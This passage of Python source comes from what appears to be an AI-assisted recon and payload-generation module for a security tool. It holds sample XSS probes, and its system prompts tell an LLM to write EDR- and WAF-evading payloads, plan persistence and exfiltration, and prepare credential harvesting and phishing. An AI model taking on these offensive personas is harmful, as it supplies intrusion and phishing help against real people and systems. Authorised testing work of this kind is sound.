HTML: <img src=x onerror=alert(1)>
JS: ';alert(1);//
Attribute: " onload=alert(1) "
```

**Bypass Techniques:**
- WAF evasion using encoding
- Filter bypass with alternative vectors
- Context-specific adaptations

**Testing Methodology:**
1. Test in safe environment first
2. Validate payload effectiveness
3. Document successful vectors
4. Follow responsible disclosure

**Note:** This is a mock response. Configure AI providers for advanced payloads.
""",
            "planning": f"""
🎯 **Reconnaissance Plan: {message}**

**Target Analysis:**
- Domain structure assessment
- Technology stack identification
- Attack surface mapping

**Methodology:**
1. **Intelligence Gathering** (30-45 min)
   - OSINT collection
   - Domain analysis
   - Infrastructure mapping

2. **Active Discovery** (60-90 min)
   - Subdomain enumeration
   - Service discovery
   - Technology identification

3. **Vulnerability Assessment** (45-60 min)
   - Security scanning
   - Takeover checks
   - Risk assessment

**Tools Sequence:**
```bash
reconcli dnscli --target {message}
reconcli permutcli --brand {message.split(".")[0] if "." in message else message}
reconcli httpcli --target {message}
reconcli vulncli --target {message}
```

**Note:** This is a mock response. Configure AI providers for detailed planning.
""",
        }

        return responses.get(context, responses["recon"])

    def ask_ai(
        self,
        message: str,
        provider: Optional[str] = None,
        context: str = "recon",
        persona: Optional[str] = None,
        use_cache: bool = True,
    ) -> Optional[str]:
        """
        Ask AI with caching, performance monitoring, and enhanced provider support.

        This is the main method for interacting with AI providers. It handles
        provider selection, caching, rate limiting, and performance monitoring.

        Args:
            message (str): The question or prompt to send to the AI
            provider (Optional[str]): Specific provider to use (openai, anthropic, gemini, local)
            context (str): Context type (recon, payload, planning) for appropriate prompting
            persona (Optional[str]): Security persona (redteam, bugbounty, pentester, trainer, osint)
            use_cache (bool): Whether to use cached responses if available

        Returns:
            Optional[str]: AI response text, or None if all providers fail

        Example:
            >>> response = assistant.ask_ai(
            ...     "Generate XSS payloads for HTML context",
            ...     provider="openai",
            ...     context="payload",
            ...     persona="bugbounty"
            ... )
            >>> print(response)

        Note:
            Falls back to mock responses if no AI providers are available.
            All queries and responses are tracked in the current session.
        """

        start_time = time.time()

        # Update performance metrics
        if self.config.performance_monitoring:
            self.performance_metrics["total_requests"] += 1

        # Fallback to mock if no providers available
        if not self.providers:
            response = self.ask_ai_mock(message, context)
            self._update_performance_metrics(start_time, True, provider or "mock")
            return response

        # Select provider with fallback logic
        selected_provider = self._select_provider(provider)
        if not selected_provider:
            response = self.ask_ai_mock(message, context)
            self._update_performance_metrics(start_time, True, "mock")
            return response

        # Check cache first (after provider selection)
        if use_cache and self.cache_manager:
            cached_response = self.cache_manager.get(
                message, context, persona or "default", selected_provider.name
            )
            if cached_response:
                if self.config.performance_monitoring:
                    self.performance_metrics["cache_hits"] += 1

                # Store cached response in database if enabled
                if hasattr(self, "db_connection") and self.db_connection:
                    response_time_ms = int((time.time() - start_time) * 1000)
                    self._store_ai_query(
                        message,
                        context,
                        persona or "default",
                        selected_provider.name,
                        cached_response,
                        response_time_ms,
                        True,
                    )

                return cached_response
            elif self.config.performance_monitoring:
                self.performance_metrics["cache_misses"] += 1

        # Get persona-specific system prompt
        if persona:
            system_prompt = self.get_persona_prompt(persona, context)
        else:
            system_prompt = self._get_default_prompt(context)

        # Rate limiting for parallel processing
        if self.rate_limiter:
            self.rate_limiter.acquire()

        try:
            response = self._query_provider(selected_provider, system_prompt, message)

            if response:
                # Cache the response
                if use_cache and self.cache_manager:
                    self.cache_manager.set(
                        message,
                        context,
                        persona or "default",
                        selected_provider.name,
                        response,
                    )

                # Store in database if enabled
                if hasattr(self, "db_connection") and self.db_connection:
                    response_time_ms = int((time.time() - start_time) * 1000)
                    self._store_ai_query(
                        message,
                        context,
                        persona or "default",
                        selected_provider.name,
                        response,
                        response_time_ms,
                        False,
                    )

                # Log query and result
                if self.current_session:
                    with self._lock:
                        self.current_session.queries.append(
                            {
                                "timestamp": datetime.now().isoformat(),
                                "message": message,
                                "provider": selected_provider.name,
                                "context": context,
                                "persona": persona,
                                "cached": False,
                            }
                        )
                        self.current_session.results.append(
                            {
                                "timestamp": datetime.now().isoformat(),
                                "response": response,
                                "provider": selected_provider.name,
                                "response_time": time.time() - start_time,
                            }
                        )
                        self.save_session()

                self._update_performance_metrics(
                    start_time, True, selected_provider.name
                )
                return response
            else:
                # Fallback to mock response
                response = self.ask_ai_mock(message, context)
                self._update_performance_metrics(
                    start_time, False, selected_provider.name
                )
                return response

        except Exception as e:
            if self.config.verbose_logging:
                print(f"AI provider error: {e}")

            # Fallback to mock response on error
            response = self.ask_ai_mock(message, context)
            self._update_performance_metrics(start_time, False, selected_provider.name)
            return response

    def _select_provider(
        self, preferred_provider: Optional[str] = None
    ) -> Optional[AIProviderConfig]:
        """Select AI provider with fallback logic"""
        if preferred_provider:
            provider = next(
                (
                    p
                    for p in self.providers
                    if p.name == preferred_provider and p.available
                ),
                None,
            )
            if provider:
                return provider

        # Use default provider from config
        if hasattr(self, "config") and self.config.default_provider:
            provider = next(
                (
                    p
                    for p in self.providers
                    if p.name == self.config.default_provider and p.available
                ),
                None,
            )
            if provider:
                return provider

        # Fallback to first available provider
        return next((p for p in self.providers if p.available), None)

    def _query_provider(
        self, provider: AIProviderConfig, system_prompt: str, message: str
    ) -> Optional[str]:
        """Query specific AI provider"""
        if provider.name == "openai":
            return self._query_openai(provider, system_prompt, message)
        elif provider.name == "anthropic":
            return self._query_anthropic(provider, system_prompt, message)
        elif provider.name == "gemini":
            return self._query_gemini(provider, system_prompt, message)
        elif provider.name == "local":
            return self._query_local_llm(provider, system_prompt, message)
        else:
            return None

    def _query_openai(
        self, provider: AIProviderConfig, system_prompt: str, message: str
    ) -> Optional[str]:
        """Query OpenAI provider"""
        try:
            client = openai.OpenAI(api_key=provider.api_key)
            response = client.chat.completions.create(
                model=provider.model,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": message},
                ],
                temperature=provider.temperature,
                max_tokens=provider.max_tokens,
                timeout=provider.timeout,
            )
            return response.choices[0].message.content
        except Exception as e:
            if self.config.verbose_logging:
                print(f"OpenAI error: {e}")
            return None

    def _query_anthropic(
        self, provider: AIProviderConfig, system_prompt: str, message: str
    ) -> Optional[str]:
        """Query Anthropic provider"""
        try:
            client = anthropic.Anthropic(api_key=provider.api_key)
            response = client.messages.create(
                model=provider.model,
                max_tokens=provider.max_tokens,
                messages=[{"role": "user", "content": f"{system_prompt}\n\n{message}"}],
            )
            # For now, fallback to mock to avoid type issues
            return self.ask_ai_mock(message, "recon")
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Anthropic error: {e}")
            return None

    def _query_gemini(
        self, provider: AIProviderConfig, system_prompt: str, message: str
    ) -> Optional[str]:
        """Query Gemini provider"""
        try:
            genai.configure(api_key=provider.api_key)
            model = genai.GenerativeModel(provider.model)
            response = model.generate_content(f"{system_prompt}\n\n{message}")
            return response.text
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Gemini error: {e}")
            return None

    def _query_local_llm(
        self, provider: AIProviderConfig, system_prompt: str, message: str
    ) -> Optional[str]:
        """Query local LLM provider"""
        if not self.local_llm_client:
            return None

        full_prompt = f"{system_prompt}\n\nUser: {message}\n\nAssistant:"
        return self.local_llm_client.generate(full_prompt, provider.max_tokens)

    def _update_performance_metrics(
        self, start_time: float, success: bool, provider: str
    ):
        """Update performance monitoring metrics"""
        if not self.config.performance_monitoring:
            return

        response_time = time.time() - start_time

        if success:
            self.performance_metrics["successful_requests"] += 1
        else:
            self.performance_metrics["failed_requests"] += 1

        # Update response times
        self.performance_metrics["response_times"].append(response_time)
        if len(self.performance_metrics["response_times"]) > 100:
            self.performance_metrics["response_times"] = self.performance_metrics[
                "response_times"
            ][-100:]

        # Calculate average response time
        self.performance_metrics["average_response_time"] = sum(
            self.performance_metrics["response_times"]
        ) / len(self.performance_metrics["response_times"])

        # Update provider stats
        if provider not in self.performance_metrics["provider_stats"]:
            self.performance_metrics["provider_stats"][provider] = {
                "requests": 0,
                "successes": 0,
                "failures": 0,
                "avg_response_time": 0.0,
            }

        stats = self.performance_metrics["provider_stats"][provider]
        stats["requests"] += 1
        if success:
            stats["successes"] += 1
        else:
            stats["failures"] += 1

        # Update provider average response time
        if "response_times" not in stats:
            stats["response_times"] = []
        stats["response_times"].append(response_time)
        if len(stats["response_times"]) > 50:
            stats["response_times"] = stats["response_times"][-50:]
        stats["avg_response_time"] = sum(stats["response_times"]) / len(
            stats["response_times"]
        )

    def generate_recon_plan(
        self, target: str, scope: str = "comprehensive", persona: Optional[str] = None
    ) -> Dict:
        """Advanced AI-powered reconnaissance planning and methodology generation.

        Creates comprehensive, persona-specific reconnaissance strategies using AI to
        optimize attack surface discovery, minimize detection, and maximize intelligence
        gathering based on target characteristics and assessment objectives.

        Args:
            target (str): Primary reconnaissance target
                        - Domain names (example.com, sub.example.com)
                        - IP addresses (192.168.1.1, 10.0.0.0/24)
                        - IP ranges (192.168.1.1-254)
                        - Company names (for OSINT reconnaissance)
                        - ASN numbers (AS1234 for infrastructure mapping)
                        - URLs (https://app.example.com/api)

            scope (str): Reconnaissance depth and methodology
                       - "basic": Essential discovery (subdomains, basic web enum)
                       - "comprehensive": Full attack surface mapping
                       - "cloud": Cloud-focused reconnaissance (AWS, Azure, GCP)
                       - "api": API endpoint discovery and testing
                       - "mobile": Mobile application assessment
                       - "iot": Internet of Things device enumeration
                       - "osint": Open Source Intelligence gathering
                       - "stealth": Low-detection passive reconnaissance
                       - "enterprise": Corporate infrastructure assessment
                       - "startup": Lean organization reconnaissance
                       - "government": Government entity assessment
                       - "financial": Financial services reconnaissance
                       - "healthcare": Healthcare organization assessment

            persona (Optional[str]): Reconnaissance approach and constraints
                                   - "redteam": APT-style stealth operations
                                   - "bugbounty": Efficient vulnerability discovery
                                   - "pentester": Methodical professional assessment
                                   - "trainer": Educational step-by-step approach
                                   - "osint": Passive intelligence collection only
                                   - "researcher": Academic/research methodology
                                   - "compliance": Audit-focused assessment

        Returns:
            Dict: Comprehensive reconnaissance plan and execution strategy
                {
                    "target_analysis": {
                        "target_type": str,                  # Domain/IP/Company classification
                        "organization_profile": str,         # Company/entity details
                        "technology_stack": List[str],       # Predicted technologies
                        "attack_surface_estimate": str,      # Expected surface size
                        "threat_landscape": List[str],       # Relevant threat actors
                        "compliance_requirements": List[str], # Regulatory considerations
                        "geographic_presence": List[str],    # Physical/legal jurisdictions
                        "industry_classification": str       # Business sector
                    },
                    "reconnaissance_phases": [
                        {
                            "phase_name": str,               # Human-readable phase name
                            "phase_number": int,             # Execution order
                            "description": str,              # Phase objectives
                            "tools_required": List[str],     # ReconCLI modules needed
                            "commands": List[str],           # Specific commands to run
                            "expected_duration": str,        # Time estimate
                            "stealth_level": str,            # Detection risk level
                            "data_sources": List[str],       # Information sources
                            "success_criteria": List[str],   # How to measure success
                            "failure_indicators": List[str], # Signs of problems
                            "next_phase_triggers": List[str], # Conditions for next phase
                            "parallel_execution": bool,      # Can run concurrently
                            "dependencies": List[str],       # Required previous phases
                            "output_artifacts": List[str],   # Files/data generated
                            "quality_checks": List[str]      # Validation steps
                        }
                    ],
                    "methodology": {
                        "approach": str,                     # Overall strategy
                        "priority_targets": List[str],       # High-value assets
                        "exclusions": List[str],             # Out-of-scope items
                        "detection_avoidance": List[str],    # Stealth techniques
                        "noise_reduction": List[str],        # Traffic minimization
                        "timing_considerations": List[str],  # Optimal execution times
                        "backup_strategies": List[str],      # Alternative approaches
                        "escalation_paths": List[str]        # Next steps if blocked
                    },
                    "toolchain_integration": {
                        "reconcli_modules": List[str],       # ReconCLI tools to use
                        "external_tools": List[str],         # Third-party tools
                        "automation_scripts": List[str],     # Custom automation
                        "data_correlation": List[str],       # Cross-module analysis
                        "reporting_pipeline": List[str],     # Results aggregation
                        "quality_assurance": List[str],      # Data validation
                        "continuous_monitoring": List[str],  # Ongoing surveillance
                        "alert_mechanisms": List[str]        # Change detection
                    },
                    "risk_assessment": {
                        "legal_considerations": List[str],   # Legal compliance
                        "detection_probability": str,        # Likelihood of detection
                        "impact_on_target": str,            # Potential target impact
                        "attribution_risks": List[str],      # Identity exposure risks
                        "operational_security": List[str],   # OpSec recommendations
                        "emergency_procedures": List[str],   # Incident response
                        "evidence_handling": List[str],      # Data protection
                        "disclosure_timeline": str           # Vulnerability disclosure
                    },
                    "success_metrics": {
                        "coverage_targets": Dict[str, str], # Coverage percentage goals
                        "quality_indicators": List[str],   # Data quality measures
                        "time_benchmarks": Dict[str, str], # Performance targets
                        "detection_limits": Dict[str, str], # Acceptable detection levels
                        "intelligence_value": List[str],   # Information value metrics
                        "actionability_score": str,        # Actionable findings ratio
                        "false_positive_rate": str,        # Data accuracy measures
                        "comprehensive_score": str         # Overall assessment quality
                    },
                    "deliverables": {
                        "executive_summary": str,          # High-level findings
                        "technical_report": str,           # Detailed technical analysis
                        "attack_surface_map": str,         # Visual attack surface
                        "vulnerability_matrix": str,       # Risk prioritization
                        "remediation_roadmap": str,        # Security improvements
                        "monitoring_recommendations": str,  # Ongoing security
                        "compliance_assessment": str,      # Regulatory status
                        "threat_intelligence": str         # Threat landscape analysis
                    }
                }

        Examples:
            # Basic bug bounty reconnaissance plan
            plan = assistant.generate_recon_plan(
                "example.com",
                scope="basic",
                persona="bugbounty"
            )

            # Comprehensive penetration test planning
            plan = assistant.generate_recon_plan(
                "target-corp.com",
                scope="comprehensive",
                persona="pentester"
            )

            # Stealth red team operation
            plan = assistant.generate_recon_plan(
                "192.168.1.0/24",
                scope="stealth",
                persona="redteam"
            )

            # Cloud infrastructure assessment
            plan = assistant.generate_recon_plan(
                "cloud-app.com",
                scope="cloud",
                persona="pentester"
            )

            # Execute reconnaissance phases
            for phase in plan["reconnaissance_phases"]:
                print(f"Phase {phase['phase_number']}: {phase['phase_name']}")
                print(f"Duration: {phase['expected_duration']}")
                print(f"Tools: {', '.join(phase['tools_required'])}")

        Note:
            - Automatically adapts methodology based on target characteristics
            - Integrates seamlessly with all ReconCLI modules
            - Provides detailed timing and stealth considerations
            - Includes legal and compliance guidance
            - Supports both manual and automated execution
            - Generates professional deliverables and reporting
        """
        scope_templates = {
            "basic": ["subdomain_enum", "web_discovery"],
            "comprehensive": ["subdomain_enum", "web_discovery", "vulnerability_scan"],
            "cloud": ["cloud_recon", "subdomain_enum", "web_discovery"],
            "api": ["web_discovery", "vulnerability_scan"],
        }

        selected_templates = scope_templates.get(
            scope, scope_templates["comprehensive"]
        )

        # Build detailed plan
        plan = {
            "target": target,
            "scope": scope,
            "created": datetime.now().isoformat(),
            "phases": [],
        }

        for template_name in selected_templates:
            template = self.recon_templates[template_name]

            phase = {
                "name": template_name,
                "description": template["description"],
                "tools": template["tools"],
                "phases": template["phases"],
                "estimated_time": self._estimate_time(template_name),
                "commands": self._generate_commands(target, template_name),
            }

            plan["phases"].append(phase)

        # Ask AI for additional recommendations
        ai_prompt = f"""
        Create a detailed reconnaissance plan for target: {target}
        Scope: {scope}

        Consider:
        1. Target type and technology stack
        2. Optimal tool selection and ordering
        3. Potential challenges and mitigations
        4. Time estimates and resource requirements
        5. Output formats and reporting needs

        Provide specific command examples and best practices.
        """

        ai_recommendations = self.ask_ai(ai_prompt, context="planning", persona=persona)
        plan["ai_recommendations"] = ai_recommendations

        if self.current_session:
            self.current_session.plan = plan
            self.save_session()

        return plan

    def _estimate_time(self, template_name: str) -> str:
        """Estimate time for reconnaissance phase"""
        time_estimates = {
            "subdomain_enum": "30-60 minutes",
            "web_discovery": "45-90 minutes",
            "vulnerability_scan": "60-120 minutes",
            "cloud_recon": "30-45 minutes",
        }
        return time_estimates.get(template_name, "30-60 minutes")

    def _generate_commands(self, target: str, template_name: str) -> List[str]:
        """Generate specific commands for reconnaissance phase"""
        commands = {
            "subdomain_enum": [
                f"python main.py dnscli --target {target} --wordlist-size large",
                f"python main.py permutcli --brand {target} --tools subfinder,amass",
                "python main.py tagger --input subs_resolved.txt --output tagged_subs.json",
            ],
            "web_discovery": [
                f"python main.py httpcli --target {target} --tech-detect",
                f"python main.py urlcli --target {target} --deep-crawl",
                f"python main.py dirbcli --target {target} --wordlist-size large",
            ],
            "vulnerability_scan": [
                f"python main.py vulncli --target {target} --comprehensive",
                f"python main.py vulnsqlicli --target {target} --advanced",
                f"python main.py takeovercli --target {target}",
            ],
            "cloud_recon": [
                f"python main.py cloudcli --target {target} --provider all",
                f"python main.py permutcli --brand {target} --bucket-scan",
                f"python main.py dnscli --target {target} --cloud-enum",
            ],
        }
        return commands.get(template_name, [])

    def generate_payload(
        self,
        payload_type: str,
        context: Optional[str] = None,
        technique: Optional[str] = None,
        persona: Optional[str] = None,
    ) -> Dict:
        """Advanced AI-powered payload generation with context-aware optimization.

        Generates sophisticated, context-specific security testing payloads using AI
        to create novel attack vectors, bypass techniques, and evasion mechanisms
        tailored to specific environments and defensive measures.

        Args:
            payload_type (str): Primary vulnerability class to target
                              - "xss": Cross-Site Scripting (DOM, Reflected, Stored)
                              - "sqli": SQL Injection (Union, Boolean, Time-based, Error)
                              - "lfi": Local File Inclusion (Directory traversal, Filter bypass)
                              - "rfi": Remote File Inclusion (HTTP, FTP, SMB wrappers)
                              - "ssti": Server-Side Template Injection (Jinja2, Twig, Freemarker)
                              - "ssrf": Server-Side Request Forgery (HTTP, Gopher, File protocols)
                              - "idor": Insecure Direct Object Reference (Sequential, GUID)
                              - "csrf": Cross-Site Request Forgery (GET, POST, SameSite bypass)
                              - "xxe": XML External Entity (Classic, Blind, SOAP)
                              - "nosqli": NoSQL Injection (MongoDB, CouchDB, Redis)
                              - "ldapi": LDAP Injection (Authentication bypass, Enumeration)
                              - "cmdi": Command Injection (OS command execution)
                              - "deserialization": Unsafe deserialization exploits

            context (Optional[str]): Execution environment and constraints
                                   - "html": HTML document context, DOM manipulation
                                   - "javascript": JS execution environment
                                   - "mysql": MySQL database system specifics
                                   - "postgresql": PostgreSQL syntax and features
                                   - "mssql": Microsoft SQL Server functions
                                   - "oracle": Oracle Database procedures
                                   - "mongodb": MongoDB NoSQL operations
                                   - "redis": Redis in-memory data store
                                   - "linux": Linux OS command execution
                                   - "windows": Windows command prompt/PowerShell
                                   - "cloud": Cloud service SSRF contexts (AWS, Azure, GCP)
                                   - "api": REST/GraphQL API endpoint testing
                                   - "mobile": Mobile application contexts
                                   - "iot": Internet of Things device constraints

            technique (Optional[str]): Specific attack methodology
                                     - "reflection": Reflected XSS techniques
                                     - "stored": Persistent XSS storage
                                     - "dom": DOM-based XSS manipulation
                                     - "union": SQL UNION-based injection
                                     - "boolean": Boolean-based blind SQLi
                                     - "time": Time-based blind SQLi
                                     - "error": Error-based SQLi information disclosure
                                     - "obfuscation": WAF/filter bypass obfuscation
                                     - "encoding": Multiple encoding layer bypass
                                     - "polyglot": Multi-context payload compatibility
                                     - "steganography": Hidden payload embedding
                                     - "mutation": Evolutionary payload development

            persona (Optional[str]): Attack perspective and constraints
                                   - "redteam": Stealth, evasion, persistence focus
                                   - "bugbounty": High-impact, quick validation payloads
                                   - "pentester": Methodical, documented approach
                                   - "trainer": Educational, explainable techniques
                                   - "researcher": Novel, experimental approaches

        Returns:
            Dict: Comprehensive payload generation results
                {
                    "payloads": [
                        {
                            "payload": str,                    # Primary attack payload
                            "variants": List[str],             # Alternative forms
                            "encoded_versions": List[str],     # Bypass encoded variants
                            "description": str,                # Technical explanation
                            "attack_vector": str,              # How to deliver payload
                            "expected_behavior": str,          # What should happen
                            "detection_signatures": List[str], # Known detection patterns
                            "bypass_techniques": List[str],    # WAF/filter evasion
                            "success_indicators": List[str],   # How to verify success
                            "false_positive_risk": str,        # Risk assessment
                            "remediation": str,                # How to fix vulnerability
                            "references": List[str],           # CVE/research links
                            "mitre_techniques": List[str],     # MITRE ATT&CK mapping
                            "severity_score": float,           # CVSS-like scoring
                            "exploit_complexity": str,         # LOW/MEDIUM/HIGH
                            "privilege_required": str,         # User interaction needed
                            "scope_impact": str                # Impact scope assessment
                        }
                    ],
                    "context_analysis": {
                        "target_technology": str,            # Detected tech stack
                        "input_validation": str,             # Validation mechanisms
                        "output_encoding": str,              # Encoding protections
                        "security_headers": List[str],       # Present security headers
                        "waf_detection": str,                # WAF presence/type
                        "recommended_approach": str          # Best attack strategy
                    },
                    "advanced_techniques": {
                        "polyglot_payloads": List[str],      # Multi-context payloads
                        "mutation_seeds": List[str],         # Evolutionary base payloads
                        "steganographic_variants": List[str], # Hidden/obfuscated forms
                        "protocol_manipulation": List[str],  # Protocol-level attacks
                        "encoding_chains": List[str],        # Multi-layer encoding
                        "sandbox_escapes": List[str]         # Sandbox bypass techniques
                    },
                    "defense_evasion": {
                        "signature_evasion": List[str],      # IDS/IPS bypass methods
                        "behavior_mimicry": List[str],       # Legitimate traffic mimicking
                        "timing_attacks": List[str],         # Time-based evasion
                        "fragmentation": List[str],          # Payload fragmentation
                        "protocol_tunneling": List[str],     # Protocol abuse techniques
                        "social_engineering": List[str]      # Human factor exploitation
                    },
                    "testing_guidance": {
                        "verification_steps": List[str],     # How to test payloads
                        "automation_scripts": List[str],     # Testing automation
                        "manual_testing_tips": List[str],    # Manual verification
                        "false_positive_checks": List[str],  # Avoiding false results
                        "impact_demonstration": List[str],   # Proof of concept steps
                        "reporting_templates": List[str]     # Vulnerability reporting
                    }
                }

        Examples:
            # Basic XSS payload for HTML context
            result = assistant.generate_payload("xss", "html", "reflection")

            # Advanced SQL injection with database-specific techniques
            result = assistant.generate_payload(
                "sqli",
                context="mysql",
                technique="union",
                persona="pentester"
            )

            # Stealth SSRF for cloud environments
            result = assistant.generate_payload(
                "ssrf",
                context="cloud",
                technique="obfuscation",
                persona="redteam"
            )

            # Educational SSTI demonstration
            result = assistant.generate_payload(
                "ssti",
                context="jinja2",
                persona="trainer"
            )

            for payload_data in result["payloads"]:
                print(f"Payload: {payload_data['payload']}")
                print(f"Bypass techniques: {payload_data['bypass_techniques']}")

        Note:
            - Generates multiple payload variants for comprehensive testing
            - Includes WAF/filter bypass techniques automatically
            - Provides detailed remediation guidance for each payload
            - Maps to MITRE ATT&CK framework for threat intelligence
            - Supports both manual and automated testing workflows
            - Includes detection signature analysis for evasion planning
        """
        if payload_type not in self.payload_categories:
            return {"error": f"Unknown payload type: {payload_type}"}

        category = self.payload_categories[payload_type]

        # Build AI prompt for payload generation
        ai_prompt = f"""
        Generate advanced {payload_type.upper()} payloads with the following specifications:

        Payload Type: {payload_type}
        Context: {context or "general"}
        Technique: {technique or "all"}

        Available contexts: {", ".join(category["contexts"])}
        Available techniques: {", ".join(category["techniques"])}

        Please provide:
        1. Multiple payload variations
        2. Context-specific adaptations
        3. Bypass techniques for common WAFs
        4. Explanation of each payload's mechanism
        5. Testing methodology and validation steps

        Format as structured payload examples with clear explanations.
        """

        ai_response = self.ask_ai(ai_prompt, context="payload", persona=persona)

        payload_data = {
            "type": payload_type,
            "context": context,
            "technique": technique,
            "category_info": category,
            "generated_at": datetime.now().isoformat(),
            "payloads": ai_response,
        }

        return payload_data

    def analyze_target(self, target: str, persona: Optional[str] = None) -> Dict:
        """Perform AI-powered target analysis"""
        analysis_prompt = f"""
        Perform comprehensive target analysis for: {target}

        Analyze:
        1. Domain structure and naming patterns
        2. Technology stack indicators
        3. Potential attack surfaces
        4. Subdomain enumeration strategies
        5. Cloud infrastructure indicators
        6. Security posture assessment
        7. Reconnaissance methodology recommendations

        Provide actionable insights and specific tool recommendations.
        """

        ai_analysis = self.ask_ai(analysis_prompt, context="recon", persona=persona)

        analysis_data = {
            "target": target,
            "analyzed_at": datetime.now().isoformat(),
            "analysis": ai_analysis,
            "recommendations": self._extract_recommendations(ai_analysis or ""),
        }

        return analysis_data

    def _extract_recommendations(self, analysis: str) -> List[str]:
        """Extract actionable recommendations from AI analysis"""
        # Simple regex-based extraction - could be enhanced with NLP
        recommendations = []

        lines = analysis.split("\n")
        for line in lines:
            if any(
                indicator in line.lower()
                for indicator in ["recommend", "suggest", "should", "consider"]
            ):
                recommendations.append(line.strip())

        return recommendations[:10]  # Limit to top 10 recommendations

    def get_persona_prompt(self, persona: str, context: str) -> str:
        """Get persona-specific system prompts"""
        personas = {
            "redteam": {
                "recon": """You are an elite RED TEAM operator specialized in offensive security and stealth operations:
- Focus on evasion techniques, anti-detection methods, and stealthy reconnaissance
- Prioritize techniques that bypass security controls and monitoring systems
- Emphasize operational security (OPSEC) and leaving minimal forensic traces
- Provide advanced tactics for penetrating hardened environments
- Consider threat hunting evasion and living-off-the-land techniques
- Think like an APT actor with long-term persistence goals

Your responses should be tactical, stealthy, and focused on remaining undetected while gathering maximum intelligence.""",
                "payload": """You are an elite RED TEAM payload specialist focused on evasion and stealth:
- Develop payloads that bypass modern EDR, AV, and WAF solutions
- Focus on polymorphic and metamorphic techniques
- Emphasize fileless attacks and memory-only execution
- Provide advanced obfuscation and encoding methods
- Consider sandbox evasion and environment awareness
- Think about lateral movement and persistence mechanisms

Provide sophisticated, evasive payloads with detailed bypass explanations.""",
                "planning": """You are an elite RED TEAM operation planner specializing in adversarial simulation:
- Design attack paths that mirror real APT groups and nation-state actors
- Focus on multi-stage operations with persistence and stealth
- Emphasize MITRE ATT&CK framework alignment
- Consider defensive countermeasures and how to evade them
- Plan for long-term access and data exfiltration scenarios
- Think about covering tracks and maintaining operational security

Provide comprehensive attack scenarios with realistic timelines and TTPs.""",
            },
            "bugbounty": {
                "recon": """You are a TOP-TIER BUG BOUNTY HUNTER focused on finding critical vulnerabilities quickly:
- Prioritize high-impact vulnerabilities that yield maximum bounty rewards
- Focus on common bug bounty targets: XSS, SQLi, IDOR, RCE, authentication bypasses
- Emphasize automation and tool chaining for efficient hunting
- Consider program scope limitations and rules of engagement
- Think about edge cases and unusual attack vectors that others miss
- Focus on modern web technologies and cloud infrastructure

Provide actionable reconnaissance strategies optimized for bug bounty success rates.""",
                "payload": """You are a MASTER BUG BOUNTY HUNTER specializing in exploit development:
- Create payloads that demonstrate clear business impact for bug bounty reports
- Focus on critical vulnerabilities: RCE, SQLi, authentication bypasses, privilege escalation
- Provide proof-of-concept exploits that are safe for production testing
- Consider real-world exploitation scenarios and business logic flaws
- Think about chaining vulnerabilities for maximum impact
- Focus on modern frameworks and technologies commonly used by targets

Deliver high-impact payloads with clear exploitation steps for bug bounty documentation.""",
                "planning": """You are an EXPERT BUG BOUNTY STRATEGIST focused on efficient vulnerability discovery:
- Design reconnaissance workflows optimized for finding critical bugs quickly
- Prioritize targets and attack surfaces with highest vulnerability potential
- Focus on automation and tool integration for scalable hunting
- Consider program-specific methodologies and past successful discoveries
- Think about time management and parallel testing approaches
- Emphasize documentation and reporting throughout the process

Provide streamlined hunting methodologies focused on maximizing bounty potential.""",
            },
            "pentester": {
                "recon": """You are a PROFESSIONAL PENETRATION TESTER following industry-standard methodologies:
- Follow structured penetration testing frameworks (OWASP, NIST, PTES)
- Emphasize thorough documentation and evidence collection throughout
- Focus on compliance requirements and regulatory standards
- Provide detailed risk assessments and business impact analysis
- Consider remediation guidance and compensating controls
- Think about client communication and professional reporting standards

Deliver comprehensive, methodical approaches suitable for professional engagements.""",
                "payload": """You are a PROFESSIONAL PENETRATION TESTER specializing in controlled exploitation:
- Develop payloads appropriate for professional penetration testing engagements
- Focus on demonstrating vulnerability impact without causing damage
- Emphasize safe exploitation techniques suitable for production environments
- Provide detailed documentation for professional reporting requirements
- Consider legal and ethical implications of payload usage
- Think about client-specific constraints and scope limitations

Provide professional-grade exploits with comprehensive testing procedures and documentation.""",
                "planning": """You are a SENIOR PENETRATION TESTING CONSULTANT designing comprehensive assessment strategies:
- Create structured testing methodologies following industry frameworks
- Focus on comprehensive coverage of attack surfaces and threat vectors
- Emphasize risk-based approaches and business impact considerations
- Plan for detailed documentation and evidence collection requirements
- Consider compliance frameworks and regulatory requirements
- Think about client communication checkpoints and milestone deliverables

Design professional penetration testing methodologies with clear deliverables and timelines.""",
            },
            "trainer": {
                "recon": """You are an EXPERT CYBERSECURITY INSTRUCTOR teaching advanced reconnaissance techniques:
- Break down complex concepts into digestible, educational steps
- Provide clear explanations of WHY each technique works, not just HOW
- Include learning objectives and practical exercises for skill development
- Explain the underlying principles and theoretical foundations
- Consider different learning styles and provide multiple explanation approaches
- Think about common student misconceptions and address them proactively

Focus on education, understanding, and skill building rather than just immediate results.""",
                "payload": """You are a CYBERSECURITY EDUCATION SPECIALIST teaching ethical hacking and payload development:
- Explain payload mechanics in an educational, step-by-step manner
- Focus on understanding the underlying vulnerabilities and attack vectors
- Provide safe, educational examples appropriate for learning environments
- Include detailed explanations of security controls and mitigation strategies
- Emphasize ethical considerations and responsible disclosure principles
- Think about hands-on labs and practical learning exercises

Deliver educational content that builds deep understanding of security principles.""",
                "planning": """You are a CYBERSECURITY CURRICULUM DEVELOPER designing comprehensive training programs:
- Create structured learning paths that build skills progressively
- Focus on educational objectives and measurable learning outcomes
- Provide theoretical foundations along with practical applications
- Include assessment methods and skill validation approaches
- Consider different experience levels and learning prerequisites
- Think about real-world application and career development paths

Design educational reconnaissance programs that develop both technical skills and strategic thinking.""",
            },
            "osint": {
                "recon": """You are an ELITE OSINT SPECIALIST focusing on passive intelligence gathering:
- Prioritize completely passive reconnaissance techniques that leave no traces
- Focus on public information sources, social media, and leaked data
- Emphasize advanced Google dorking, GitHub reconnaissance, and metadata analysis
- Consider historical data, cached content, and wayback machine analysis
- Think about social engineering preparation and human intelligence gathering
- Focus on building comprehensive target profiles from open sources only

Provide sophisticated passive reconnaissance techniques that gather maximum intelligence without detection.""",
                "payload": """You are an OSINT SPECIALIST focusing on information gathering and social engineering preparation:
- Create reconnaissance payloads for gathering additional intelligence
- Focus on phishing simulations and social engineering scenarios
- Emphasize information harvesting and credential collection techniques
- Consider psychological manipulation and social engineering vectors
- Think about pretexting scenarios and human intelligence operations
- Focus on building trust and establishing legitimate-appearing presence

